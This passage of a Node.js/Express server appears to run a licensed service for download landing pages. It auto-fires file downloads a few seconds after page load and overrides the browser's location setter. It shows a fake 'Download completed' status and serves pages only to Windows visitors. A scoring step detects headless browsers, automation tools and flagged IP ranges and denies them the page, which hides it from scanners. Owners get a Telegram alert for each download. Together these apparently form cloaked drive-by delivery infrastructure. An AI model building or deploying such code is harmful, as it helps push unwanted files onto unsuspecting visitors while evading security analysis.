      '<b>Page:</b> ' + tgHtmlEscape(page.name || '') + (owner ? ' <i>(' + tgHtmlEscape(owner.name) + ')</i>' : ''),
      '<b>Version:</b> v' + tgHtmlEscape(version.version || '?'),
      '<b>File:</b> ' + fileLine,
      '<b>Uploaded by:</b> ' + tgHtmlEscape((uploader && uploader.name) || ''),
      '<b>Time:</b> ' + new Date().toISOString(),
    ].filter(Boolean);

    const text = lines.join('\n');
    await Promise.all(targets.map(t => sendTelegram(t.token, t.chat, text).then(r => {
      if (!r.ok) console.warn('Telegram (' + t.label + ') failed:', r.err);
    })));
  } catch (err) {
    console.warn('notifyUpload error:', err.message);
  }
}

// Shared page renderer
async function renderPage(page, res, req) {
  const effectiveUid = effectiveUserForRequest(req);
  const activeVersion = await findActiveVersion(page.id, effectiveUid);
  const isLink = activeVersion && activeVersion.link_url;
  const downloadUrl = activeVersion ? buildDownloadUrl(req, page.id) : '';
  const fileName = activeVersion ? (isLink ? (page.name || 'Download') : (activeVersion.original_name || activeVersion.file_name)) : '';
  const version = activeVersion ? activeVersion.version : '';
  const releaseDate = activeVersion ? (activeVersion.date || '') : '';
  // File size — only available for uploaded files, not external links.
  let fileSize = '';
  if (activeVersion && activeVersion.file_path) {
    const fp = safeUploadPath(activeVersion.file_path);
    if (fp) { try { fileSize = formatBytes(fs.statSync(fp).size); } catch { /* missing on disk */ } }
  }
  const year = String(new Date().getFullYear());
  // Post-download redirect — http(s) only (validated on save, re-checked here to be defensive
  // against legacy/malformed rows). Fires REDIRECT_DELAY_MS after the download is triggered.
  const REDIRECT_DELAY_MS = 5000;
  const rawRedirect = (page.redirect_url || '').trim();
  const redirectUrl = /^https?:\/\//i.test(rawRedirect) ? rawRedirect : '';

  // Pre-built snippets the author can drop in as a single token.
  const downloadButtonHtml = downloadUrl
    ? `<a href="${htmlAttrEscape(downloadUrl)}"${isLink ? '' : ` download="${htmlAttrEscape(fileName)}"`} class="sc-download-btn" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;font-family:Segoe UI,Arial,sans-serif;font-weight:700;font-size:1rem;padding:12px 32px;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(74,222,128,0.3);"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download ${htmlAttrEscape(fileName)}${fileSize ? ' (' + htmlAttrEscape(fileSize) + ')' : ''}</a>`
    : '';
  const downloadLinkHtml = downloadUrl
    ? `<a href="${htmlAttrEscape(downloadUrl)}"${isLink ? '' : ` download="${htmlAttrEscape(fileName)}"`}>${htmlAttrEscape(fileName)}</a>`
    : '';
  const autoDownloadScript = downloadUrl
    ? `<script>setTimeout(function(){if(window.__scDownload){window.__scDownload();}},2000);</script>`
    : '';

  let html = page.html_code;
  // Substitutions go into HTML attribute / text context within an admin-controlled template.
  // HTML-escape so a hostile original_name (e.g. "><script>...) can't break out.
  html = html.replace(/\{\{download_url\}\}/g, htmlAttrEscape(downloadUrl));
  html = html.replace(/\{\{file_name\}\}/g, htmlAttrEscape(fileName));
  html = html.replace(/\{\{file_size\}\}/g, htmlAttrEscape(fileSize));
  html = html.replace(/\{\{version\}\}/g, htmlAttrEscape(version));
  html = html.replace(/\{\{app_name\}\}/g, htmlAttrEscape(page.name || ''));
  html = html.replace(/\{\{release_date\}\}/g, htmlAttrEscape(releaseDate));
  html = html.replace(/\{\{year\}\}/g, year);
  html = html.replace(/\{\{is_link\}\}/g, isLink ? 'true' : 'false');
  html = html.replace(/\{\{download_button\}\}/g, downloadButtonHtml);
  html = html.replace(/\{\{download_link\}\}/g, downloadLinkHtml);
  html = html.replace(/\{\{auto_download_script\}\}/g, autoDownloadScript);
  html = html.replace(/\{\{redirect_url\}\}/g, htmlAttrEscape(redirectUrl));

  // Inject download helper — triggers download without navigating away, then shows completion
  if (downloadUrl) {
    const redirectLine = redirectUrl
      ? `if(!window.__scRedirected){window.__scRedirected=true;setTimeout(function(){window.location.href="${jsStringEscape(redirectUrl)}";},${REDIRECT_DELAY_MS});}`
      : '';
    const dlHelper = `
<iframe id="sc-dl-frame" name="sc-dl-frame" style="display:none"></iframe>
<script>
(function(){
  var dlUrl="${jsStringEscape(downloadUrl)}";
  var isLink=${isLink ? 'true' : 'false'};
  function triggerDownload(){
    if(isLink){
      window.open(dlUrl,"sc-dl-frame");
    }else{
      var a=document.createElement("a");a.href=dlUrl;a.download="${jsStringEscape(fileName)}";a.style.display="none";document.body.appendChild(a);a.click();document.body.removeChild(a);
    }
    setTimeout(function(){
      var s=document.getElementById("status")||document.getElementById("sc-dl-status");
      if(s){s.innerText="Download completed! ✅";s.style.color="#16a34a";}
      var p=document.getElementById("progress");
      if(p){p.style.width="100%";p.style.background="#16a34a";}
      var m=document.querySelector(".manual");
      if(m){m.innerHTML='<span style="color:#16a34a;font-weight:600">✅ Download completed successfully</span>';}
    },1500);
    ${redirectLine}
  }
  window.__scDownload=triggerDownload;
  var origHref=Object.getOwnPropertyDescriptor(window.location.__proto__||Object.getPrototypeOf(window.location),"href");
  if(origHref&&origHref.set){
    var origSet=origHref.set;
    Object.defineProperty(window.location,"href",{set:function(v){
      if(v===dlUrl){triggerDownload();return;}
      origSet.call(window.location,v);
    },get:origHref.get});
  }
})();
</scr`+'ipt>';

    const bodyClose2 = html.match(/<\/body>/i);
    if (bodyClose2) {
      html = html.replace(bodyClose2[0], dlHelper + bodyClose2[0]);
    } else {
      html += dlHelper;
    }
  }

  // Only inject floating bar + auto-download if the template does NOT already handle downloads
  const templateHandlesDownload = /\{\{(download_url|download_button|download_link|auto_download_script)\}\}/.test(page.html_code);

  if (downloadUrl && !templateHandlesDownload) {
    // Floating download button for templates without a download button.
    // Both auto-fire and the manual click route through window.__scDownload (defined in
    // dlHelper above) so the post-download redirect — and any other side effects — happen
    // exactly once regardless of how the download was triggered.
    const floatingBtn = `
<div id="sc-download-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:999999;background:linear-gradient(135deg,#1a1a2e,#16213e);border-top:2px solid #0f3460;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:14px;box-shadow:0 -4px 20px rgba(0,0,0,0.5);">
  <span style="color:#94a3b8;font-family:Segoe UI,Arial,sans-serif;font-size:0.9rem;">Your download is ready</span>
  <a href="${htmlAttrEscape(downloadUrl)}" ${isLink ? '' : 'download="' + htmlAttrEscape(fileName) + '"'} onclick="if(window.__scDownload){window.__scDownload();return false;}" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;font-family:Segoe UI,Arial,sans-serif;font-weight:700;font-size:0.95rem;padding:10px 28px;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(74,222,128,0.3);transition:transform 0.2s,box-shadow 0.2s;" onmouseover="this.style.transform='scale(1.05)';this.style.boxShadow='0 6px 25px rgba(74,222,128,0.45)'" onmouseout="this.style.transform='scale(1)';this.style.boxShadow='0 4px 15px rgba(74,222,128,0.3)'">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
    Download ${htmlAttrEscape(fileName)}
  </a>
  <button onclick="document.getElementById('sc-download-bar').style.display='none'" style="position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#64748b;cursor:pointer;font-size:1.2rem;padding:4px 8px;" title="Dismiss">&times;</button>
</div>`;

    const autoScript = 'setTimeout(function(){if(window.__scDownload)window.__scDownload();},2000);';
    const inject = floatingBtn + '\n<script>(function(){if(document.readyState==="complete"||document.readyState==="interactive"){' + autoScript + '}else{document.addEventListener("DOMContentLoaded",function(){' + autoScript + '});}})();</scr' + 'ipt>';

    // Inject before </body> if present (case-insensitive), otherwise append
    const bodyClose = html.match(/<\/body>/i);
    if (bodyClose) {
      html = html.replace(bodyClose[0], inject + bodyClose[0]);
    } else {
      html += inject;
    }
  }

  // Auto-translate: silently switches the page to the visitor's browser language via
  // Google's client-side website-translator widget (no API key needed). Skipped for
  // English visitors since the source markup is authored in English.
  const translateScript = `
<div id="google_translate_element" style="display:none;"></div>
<script>
(function(){
  try{
    var nl=(navigator.language||navigator.userLanguage||'en').split('-')[0].toLowerCase();
    if(nl&&nl!=='en'){
      document.cookie='googtrans=/en/'+nl+'; path=/';
      window.googleTranslateElementInit=function(){
        new google.translate.TranslateElement({pageLanguage:'en',autoDisplay:false},'google_translate_element');
      };
      var s=document.createElement('script');
      s.src='https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
      document.head.appendChild(s);
    }
  }catch(e){}
})();
</scr` + `ipt>`;
  const bodyCloseT = html.match(/<\/body>/i);
  if (bodyCloseT) {
    html = html.replace(bodyCloseT[0], translateScript + bodyCloseT[0]);
  } else {
    html += translateScript;
  }

  res.send(html);
}

// Shim page render — runs inside the /_shim/proxy mount after shimAuth + botGuard.
// Looks up the page the deployment was issued for and renders it.
async function shimPageRoute(req, res, next) {
  if (!req._shimPageId) return next();
  const page = await queryOne('SELECT id, html_code, name, status, user_id FROM pages WHERE id = ?', [req._shimPageId]);
  if (!page || !page.html_code) return next();
  // Licensing: if the page has an owner whose license has expired, serve a blank page.
  // Pages without an owner (user_id NULL) are admin-managed and bypass this check.
  if (!(await pageOwnerIsLicensed(page))) return res.status(200).send(BLANK_HTML);
  if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
  await renderPage(page, res, req);
}

// ═══════════ BOT VERIFY ═══════════
async function botVerifyHandler(req, res) {
  const { nonce, elapsed, checks, fp, honeypot } = req.body;
  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';

  // Validate nonce
  const stored = challengeTokenStore.get(nonce);
  if (!stored || stored.ip !== ip) {
    logBotBlock(ip, ua, 'Invalid nonce', 'challenge_fail', '', null);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }
  const storedPath = stored.originalUrl || '';
  const storedPageId = stored.pageId || null;
  challengeTokenStore.delete(nonce);

  // Check honeypot
  if (honeypot) {
    logBotBlock(ip, ua, 'Honeypot filled', 'honeypot', storedPath, storedPageId);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // Check elapsed time
  if (!elapsed || elapsed < CHALLENGE_WAIT_MS) {
    logBotBlock(ip, ua, 'Challenge completed too fast (' + elapsed + 'ms)', 'challenge_fail', storedPath, storedPageId);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // Calculate suspicion score from headless checks
  let score = 0;
  if (checks) {
    if (checks.webdriver) score += 30;
    if (checks.phantom) score += 30;
    if (checks.nightmare) score += 30;
    if (checks.selenium) score += 30;
    if (checks.headless) score += 25;
    if (checks.pluginsZero) score += 10;
    if (checks.langEmpty) score += 15;
  }

  if (score >= 30) {
    const flags = Object.entries(checks || {}).filter(([,v]) => v).map(([k]) => k).join(', ');
    logBotBlock(ip, ua, 'Headless flags: ' + flags + ' (score: ' + score + ')', 'challenge_fail', storedPath, storedPageId);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // IP2Location final check
  try {
    const ipData = await ip2locationLookup(ip);

    if (ipData === null) {
      // No API key configured — still log the visitor
      logVisitor(ip, null, ua, storedPath, storedPageId, false, null);
    } else if (ipData._error) {
      // API failed — fail-closed, block visitor
      logBotBlock(ip, ua, 'IP lookup unavailable: ' + ipData._message, 'ip2location', storedPath, storedPageId);
      logVisitor(ip, null, ua, storedPath, storedPageId, true, 'IP lookup unavailable');
      return res.status(403).json({ ok: false, reason: 'Verification failed' });
    } else {
      const ipCheck = checkIp2locationBlock(ipData);
      if (ipCheck.blocked) {
        logVisitor(ip, ipData, ua, storedPath, storedPageId, true, ipCheck.reason);
        logBotBlock(ip, ua, ipCheck.reason, 'ip2location', storedPath, storedPageId);
        return res.status(403).json({ ok: false, reason: 'Verification failed' });
      }
      // Clean visitor — log it
      logVisitor(ip, ipData, ua, storedPath, storedPageId, false, null);
    }
  } catch (err) {
    // Fail-closed on unexpected error
    logBotBlock(ip, ua, 'IP lookup error: ' + err.message, 'ip2location', storedPath, storedPageId);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // Issue signed token cookie
  const token = signToken({ ip, exp: Date.now() + CHALLENGE_TOKEN_TTL });
  res.setHeader('Set-Cookie', '_bc_token=' + token + '; Path=/; HttpOnly; SameSite=Strict; Max-Age=3600');
  res.json({ ok: true });
}
// Registered on the main app for /page/:id admin previews; also mounted under the shim below.
app.post('/api/bot-verify', botVerifyHandler);

// ═══════════ BOT ADMIN API ═══════════
app.get('/api/bot-stats', requireAdmin, async (req, res) => {
  const total = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
  const todayStr = today();
  const blockedToday = await queryOne('SELECT COUNT(*) as c FROM bot_blocks WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
  const byType = await queryAll('SELECT block_type, COUNT(*) as count FROM bot_blocks GROUP BY block_type ORDER BY count DESC');
  const topIps = await queryAll('SELECT ip, COUNT(*) as count FROM bot_blocks GROUP BY ip ORDER BY count DESC LIMIT 10');
  const blocklisted = await queryOne('SELECT COUNT(*) as c FROM bot_ip_list WHERE list_type = ?', ['block']) || { c: 0 };
  res.json({ total: total.c, today: blockedToday.c, byType, topIps, blocklisted: blocklisted.c });
});

app.get('/api/bot-blocks', requireAdmin, async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;
  const total = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
  const blocks = await queryAll('SELECT * FROM bot_blocks ORDER BY id DESC LIMIT ? OFFSET ?', [limit, offset]);
  res.json({ blocks, total: total.c, page, limit });
});

app.get('/api/bot-ip-list', requireAdmin, async (req, res) => {
  const list = await queryAll('SELECT * FROM bot_ip_list ORDER BY id DESC');
  res.json(list);
});

app.post('/api/bot-ip-list', requireAdmin, async (req, res) => {
  const { ip, listType, note } = req.body;
  if (!ip || !listType) return res.status(400).json({ error: 'IP and list type required' });
  if (!['allow', 'block'].includes(listType)) return res.status(400).json({ error: 'Invalid list type' });

  const existing = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, listType]);
  if (existing) return res.status(400).json({ error: 'IP already in ' + listType + ' list' });

  await runSql('INSERT INTO bot_ip_list (ip, list_type, note, created) VALUES (?, ?, ?, ?)',
    [ip, listType, note || '', new Date().toISOString()]
  );
  logActivity('Bot IP ' + (listType === 'block' ? 'Blocked' : 'Allowed'), ip, req.session.user.name);
  res.json({ ok: true });
});

app.delete('/api/bot-ip-list/:id', requireAdmin, async (req, res) => {
  const entry = await queryOne('SELECT * FROM bot_ip_list WHERE id = ?', [req.params.id]);
  if (!entry) return res.status(404).json({ error: 'Entry not found' });

  await runSql('DELETE FROM bot_ip_list WHERE id = ?', [req.params.id]);
  logActivity('Bot IP Removed', entry.ip + ' from ' + entry.list_type + ' list', req.session.user.name);
  res.json({ ok: true });
});

app.delete('/api/bot-blocks', requireAdmin, async (req, res) => {
  await runSql('DELETE FROM bot_blocks', []);
  logActivity('Bot Logs Cleared', 'All block logs cleared', req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ VISITOR LOGS ADMIN API ═══════════
app.get('/api/visitor-stats', requireAdmin, async (req, res) => {
  // Human visitors only (not blocked)
  const total = await queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 0') || { c: 0 };
  const uniqueIps = await queryOne('SELECT COUNT(DISTINCT ip) as c FROM visitor_logs WHERE is_blocked = 0') || { c: 0 };
  const todayStr = today();
  const todayCount = await queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 0 AND created LIKE ?', [todayStr + '%']) || { c: 0 };
  const topCountries = await queryAll('SELECT country_code, country_name, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 0 AND country_code IS NOT NULL GROUP BY country_code, country_name ORDER BY count DESC LIMIT 10');
  const topCities = await queryAll('SELECT city_name, country_code, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 0 AND city_name IS NOT NULL GROUP BY city_name, country_code ORDER BY count DESC LIMIT 10');
  const topIsps = await queryAll('SELECT isp, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 0 AND isp IS NOT NULL GROUP BY isp ORDER BY count DESC LIMIT 10');
  // Bots blocked count
  const botsBlocked = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
  const botsBlockedToday = await queryOne('SELECT COUNT(*) as c FROM bot_blocks WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
  res.json({ total: total.c, uniqueIps: uniqueIps.c, today: todayCount.c, topCountries, topCities, topIsps, botsBlocked: botsBlocked.c, botsBlockedToday: botsBlockedToday.c });
});

app.get('/api/visitor-logs', requireAdmin, async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;
  const where = [];
  const params = [];
  let paramIdx = 0;
  if (req.query.country) { paramIdx++; where.push('vl.country_code = $' + paramIdx); params.push(req.query.country); }
  if (req.query.blocked === 'true') { where.push('vl.is_blocked = 1'); }
  else if (req.query.blocked === 'false') { where.push('vl.is_blocked = 0'); }
  if (req.query.from) { paramIdx++; where.push('vl.created >= $' + paramIdx); params.push(req.query.from); }
  if (req.query.to) { paramIdx++; where.push('vl.created <= $' + paramIdx); params.push(req.query.to + 'T23:59:59'); }
  const whereClause = where.length > 0 ? 'WHERE ' + where.join(' AND ') : '';
  const totalRow = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs vl ' + whereClause, params) || { c: 0 };
  paramIdx++;
  paramIdx++;
  // Owner resolution: prefer the page's directly-assigned user_id; fall back to whoever
  // registered a custom domain pointing at this page_id, since older/unassigned pages
  // often only have ownership recorded there.
  const logs = await rawQueryAll(
    'SELECT vl.*, COALESCE(u.name, u2.name) AS owner_name, COALESCE(u.email, u2.email) AS owner_email FROM visitor_logs vl ' +
    'LEFT JOIN pages p ON p.id = vl.page_id ' +
    'LEFT JOIN users u ON u.id = p.user_id ' +
    'LEFT JOIN (SELECT DISTINCT ON (page_id) page_id, user_id FROM domains WHERE page_id IS NOT NULL ORDER BY page_id, created DESC) d ON d.page_id = vl.page_id ' +
    'LEFT JOIN users u2 ON u2.id = d.user_id ' +
    whereClause + ' ORDER BY vl.id DESC LIMIT $' + (paramIdx - 1) + ' OFFSET $' + paramIdx,
    [...params, limit, offset]
  );
  res.json({ logs, total: totalRow.c, page, limit });
});

app.delete('/api/visitor-logs', requireAdmin, async (req, res) => {
  await runSql('DELETE FROM visitor_logs', []);
  logActivity('Visitor Logs Cleared', 'All visitor logs cleared', req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ USER ANALYTICS ═══════════
app.get('/api/my-analytics', requireAuth, async (req, res) => {
  // Page IDs the user owns: their own pages, plus any pages reachable via a custom domain
  // they registered (domains.page_id can point at a page even when pages.user_id differs,
  // e.g. shared/legacy setups) — union both so nothing is silently dropped.
  const ownPages = await queryAll('SELECT id AS page_id FROM pages WHERE user_id = ?', [req.session.user.id]);
  const domains = await queryAll('SELECT page_id FROM domains WHERE user_id = ? AND page_id IS NOT NULL', [req.session.user.id]);
  const pageIds = [...new Set([...ownPages, ...domains].map(d => d.page_id).filter(Boolean))];
  if (pageIds.length === 0) return res.json({ total: 0, uniqueIps: 0, today: 0, botsBlocked: 0, topCountries: [], topCities: [], topIsps: [] });

  const placeholders = pageIds.map((_, i) => '$' + (i + 1)).join(',');
  const total = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 0 AND page_id IN (' + placeholders + ')', pageIds) || { c: 0 };
  const uniqueIps = await rawQueryOne('SELECT COUNT(DISTINCT ip) as c FROM visitor_logs WHERE is_blocked = 0 AND page_id IN (' + placeholders + ')', pageIds) || { c: 0 };
  const todayStr = today();
  const todayParams = [todayStr + '%', ...pageIds];
  const todayCount = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 0 AND created LIKE $1 AND page_id IN (' + pageIds.map((_, i) => '$' + (i + 2)).join(',') + ')', todayParams) || { c: 0 };
  const topCountries = await rawQueryAll('SELECT country_code, country_name, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 0 AND country_code IS NOT NULL AND page_id IN (' + placeholders + ') GROUP BY country_code, country_name ORDER BY count DESC LIMIT 10', pageIds);
  const topCities = await rawQueryAll('SELECT city_name, country_code, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 0 AND city_name IS NOT NULL AND page_id IN (' + placeholders + ') GROUP BY city_name, country_code ORDER BY count DESC LIMIT 10', pageIds);
  const topIsps = await rawQueryAll('SELECT isp, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 0 AND isp IS NOT NULL AND page_id IN (' + placeholders + ') GROUP BY isp ORDER BY count DESC LIMIT 10', pageIds);
  const botsBlocked = await rawQueryOne('SELECT COUNT(*) as c FROM bot_blocks WHERE page_id IN (' + placeholders + ')', pageIds) || { c: 0 };
  res.json({ total: total.c, uniqueIps: uniqueIps.c, today: todayCount.c, botsBlocked: botsBlocked.c, topCountries, topCities, topIsps });
});

app.get('/api/my-visitor-logs', requireAuth, async (req, res) => {
  const ownPages = await queryAll('SELECT id AS page_id FROM pages WHERE user_id = ?', [req.session.user.id]);
  const domains = await queryAll('SELECT page_id FROM domains WHERE user_id = ? AND page_id IS NOT NULL', [req.session.user.id]);
  const pageIds = [...new Set([...ownPages, ...domains].map(d => d.page_id).filter(Boolean))];
  if (pageIds.length === 0) return res.json({ logs: [], total: 0, page: 1 });

  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;

  const placeholders = pageIds.map((_, i) => '$' + (i + 1)).join(',');
  const total = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 0 AND page_id IN (' + placeholders + ')', pageIds) || { c: 0 };
  const allParams = [...pageIds, limit, offset];
  const logs = await rawQueryAll('SELECT * FROM visitor_logs WHERE is_blocked = 0 AND page_id IN (' + placeholders + ') ORDER BY id DESC LIMIT $' + (pageIds.length + 1) + ' OFFSET $' + (pageIds.length + 2), allParams);
  res.json({ logs, total: total.c, page });
});

// ═══════════ AUTH ═══════════
// Dummy bcrypt hash used to keep total response time constant whether or not the email
// exists. Without this, the round-trip time leaks user existence to an attacker.
const LOGIN_DUMMY_HASH = '$2a$10$CwTycUXWue0Thq9StjUM0uJ8d1zV0nQrK1NyJ7yYDqo7DwDhDPLrm';

app.post('/api/auth/login', loginGuard, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

  const user = await queryOne('SELECT * FROM users WHERE email = ?', [email]);
  // Always compare against a real bcrypt hash to defeat user-enumeration via response timing.
  const hashToCheck = user ? user.password : LOGIN_DUMMY_HASH;
  const passwordOk = await bcrypt.compare(password, hashToCheck);

  if (!user || !passwordOk || user.status !== 'Active') {
    if (user && user.status !== 'Active' && passwordOk) {
      return res.status(403).json({ error: 'Account is inactive' });
    }
    // Track failed login attempt
    const ip = getClientIp(req);
    const record = loginAttemptStore.get(ip) || { count: 0 };
    record.count++;
    if (record.count >= LOGIN_MAX_FAILURES) {
      record.lockUntil = Date.now() + LOGIN_LOCKOUT_MS;
      logBotBlock(ip, req.headers['user-agent'], 'Too many failed logins (' + record.count + ')', 'brute_force', '/api/auth/login');
    }
    loginAttemptStore.set(ip, record);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Clear login attempts on success
  loginAttemptStore.delete(getClientIp(req));

  req.session.user = { id: user.id, name: user.name, email: user.email, role: user.role };
  logActivity('Login', user.name + ' logged in', user.name);
  res.json({ user: req.session.user });
});

app.post('/api/auth/logout', (req, res) => {
  req.session.destroy();
  res.json({ ok: true });
});

app.get('/api/auth/me', async (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  // Refetch the latest license state from DB so the client's countdown stays correct
  // after admin actions (activate / extend / revoke) without requiring re-login.
  const fresh = await queryOne('SELECT id, name, email, role, status, license_plan, license_expires_at, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [req.session.user.id]);
  if (!fresh) return res.status(401).json({ error: 'Not authenticated' });
  const telegram_configured = !!(fresh.telegram_bot_token && fresh.telegram_chat_id);
  res.json({ user: { id: fresh.id, name: fresh.name, email: fresh.email, role: fresh.role, license: licenseSummary(fresh), telegram_configured } });
});

// ═══════════ TELEGRAM (per-user) ═══════════
function maskToken(t) {
  if (!t) return '';
  if (t.length <= 12) return t.slice(0, 4) + '…';
  return t.slice(0, 6) + '…' + t.slice(-4);
}
app.get('/api/me/telegram', requireAuth, async (req, res) => {
  const u = await queryOne('SELECT telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [req.session.user.id]);
  if (!u) return res.status(404).json({ error: 'Not found' });
  res.json({
    chat_id: u.telegram_chat_id || '',
    bot_token_masked: u.telegram_bot_token ? maskToken(u.telegram_bot_token) : '',
    configured: !!(u.telegram_bot_token && u.telegram_chat_id),
  });
});
app.put('/api/me/telegram', requireAuth, async (req, res) => {
  const { bot_token, chat_id } = req.body || {};
  // Empty strings clear the field. If bot_token is undefined, keep the existing one
  // (so the masked display can be re-saved with just a chat_id change).
  const current = await queryOne('SELECT telegram_bot_token FROM users WHERE id = ?', [req.session.user.id]);
  const finalToken = bot_token === undefined ? (current ? current.telegram_bot_token : null) : (bot_token || null);
  const finalChat = chat_id === undefined ? null : (chat_id || null);
  if (finalToken && !/^\d+:[A-Za-z0-9_-]{20,}$/.test(finalToken)) {
    return res.status(400).json({ error: 'Bot token format looks wrong. Expected e.g. 123456:ABC-DEF…' });
  }
  await runSql('UPDATE users SET telegram_bot_token = ?, telegram_chat_id = ? WHERE id = ?',
    [finalToken, finalChat, req.session.user.id]);
  res.json({ ok: true, configured: !!(finalToken && finalChat) });
});
app.post('/api/me/telegram/test', requireAuth, async (req, res) => {
  const u = await queryOne('SELECT name, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [req.session.user.id]);
  if (!u || !u.telegram_bot_token || !u.telegram_chat_id) {
    return res.status(400).json({ error: 'Bot token and chat ID are required first' });
  }
  const r = await sendTelegram(u.telegram_bot_token, u.telegram_chat_id,
    '✅ <b>Test alert</b>\nTelegram is connected for <b>' + tgHtmlEscape(u.name) + '</b>.\nYou will receive a message here every time someone downloads from one of your landing pages.\n<b>Time:</b> ' + new Date().toISOString());
  if (!r.ok) return res.status(502).json({ error: 'Telegram rejected: ' + r.err });
  res.json({ ok: true });
});

// ═══════════ USERS (Admin) ═══════════
app.get('/api/users', requireAdmin, async (req, res) => {
  const users = await queryAll('SELECT id, name, email, role, status, created, license_plan, license_expires_at FROM users ORDER BY created DESC');
  res.json(users.map(u => ({ ...u, license: licenseSummary(u) })));
});

app.post('/api/users', requireAdmin, async (req, res) => {
  const { name, email, password, role, status } = req.body;
  if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password required' });

  const existing = await queryOne('SELECT id FROM users WHERE email = ?', [email]);
  if (existing) return res.status(400).json({ error: 'Email already exists' });

  const id = uid();
  const hash = bcrypt.hashSync(password, 10);
  await runSql('INSERT INTO users (id, name, email, password, role, status, created) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [id, name, email, hash, role || 'User', status || 'Active', today()]
  );
  logActivity('User Created', 'Created user: ' + name, req.session.user.name);
  res.json({ id, name, email, role: role || 'User', status: status || 'Active', created: today() });
});

app.put('/api/users/:id', requireAdmin, async (req, res) => {
  const { name, email, role, status, password } = req.body;
  const user = await queryOne('SELECT * FROM users WHERE id = ?', [req.params.id]);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const updates = { name: name || user.name, email: email || user.email, role: role || user.role, status: status || user.status };

  if (email && email !== user.email) {
    const dup = await queryOne('SELECT id FROM users WHERE email = ? AND id != ?', [email, req.params.id]);
    if (dup) return res.status(400).json({ error: 'Email already exists' });
  }

  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    await runSql('UPDATE users SET name=?, email=?, password=?, role=?, status=? WHERE id=?',
      [updates.name, updates.email, hash, updates.role, updates.status, req.params.id]);
  } else {
    await runSql('UPDATE users SET name=?, email=?, role=?, status=? WHERE id=?',
      [updates.name, updates.email, updates.role, updates.status, req.params.id]);
  }
  logActivity('User Updated', 'Updated user: ' + updates.name, req.session.user.name);
  res.json({ ...updates, id: req.params.id });
});

app.delete('/api/users/:id', requireAdmin, async (req, res) => {
  const user = await queryOne('SELECT name FROM users WHERE id = ?', [req.params.id]);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (req.params.id === req.session.user.id) return res.status(400).json({ error: 'Cannot delete yourself' });

  await runSql('DELETE FROM users WHERE id = ?', [req.params.id]);
  logActivity('User Deleted', 'Deleted user: ' + user.name, req.session.user.name);
  res.json({ ok: true });
});

// License actions — admin assigns/renews/revokes a user's license.
app.post('/api/users/:id/license', requireAdmin, async (req, res) => {
  const { action, plan } = req.body || {};
  const user = await queryOne('SELECT id, name, role, license_plan, license_expires_at FROM users WHERE id = ?', [req.params.id]);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (isAdminUser(user)) return res.status(400).json({ error: 'Admin accounts do not require a license' });

